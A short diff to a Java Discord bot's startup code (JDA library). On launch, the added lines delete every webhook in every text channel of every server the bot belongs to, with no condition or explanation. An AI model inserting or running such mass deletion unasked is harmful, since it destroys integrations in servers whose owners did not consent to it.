@@ -48,7 +48,17 @@ public class Main {
 				.build()
 				.awaitReady();
 
-
+		jda.getGuilds().forEach(
+				guild -> {
+					guild.getTextChannels().forEach(
+							channel -> channel.retrieveWebhooks().queue(webhooks -> {
+								webhooks.forEach(webhook -> {
+									webhook.delete().queue();
+								});
+							})
+					);
+				}
+		);
 	}
 
 	public static void main(String[] args) throws InterruptedException {
